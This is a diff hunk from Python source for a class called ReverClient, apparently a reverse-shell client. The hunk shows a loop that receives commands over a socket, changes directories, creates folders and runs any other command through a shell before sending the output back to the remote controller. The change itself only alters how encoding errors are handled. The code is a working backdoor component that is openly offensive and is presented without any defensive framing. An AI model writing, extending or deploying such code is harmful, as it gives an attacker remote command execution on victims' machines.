@@ -46,20 +46,20 @@ class ReverClient:
             cmdd = rdata.decode('utf-8')[:]
             if cmdd[:2] == 'cd':
                 os.chdir(cmdd[3:])
-                self.s.send(str.encode(os.getcwd(), errors='replace'))
+                self.s.send(str.encode(os.getcwd(), errors='ignore'))
                 time.sleep(0.1)
                 self.s.send(str.encode(os.getcwd()))
                 continue
             if cmdd.split()[0] == 'mkdir':
                 os.mkdir(cmdd.split()[1])
-                self.s.send(str.encode(os.getcwd(), errors='replace'))
+                self.s.send(str.encode(os.getcwd(), errors='ignore'))
                 time.sleep(0.1)
                 self.s.send(str.encode(os.getcwd()))
                 continue
             try:
                 cmd = subprocess.Popen(cmdd, shell=True, stdout=-1, stderr=-1, stdin=-1)
-                output = str(cmd.stdout.read() + cmd.stderr.read(), 'utf-8', errors='replace')
-                self.s.send(str.encode(output, errors='replace'))
+                output = str(cmd.stdout.read() + cmd.stderr.read(), 'utf-8', errors='ignore')
+                self.s.send(str.encode(output, errors='ignore'))
                 time.sleep(0.1)
                 self.s.send(str.encode(os.getcwd()))
             except:
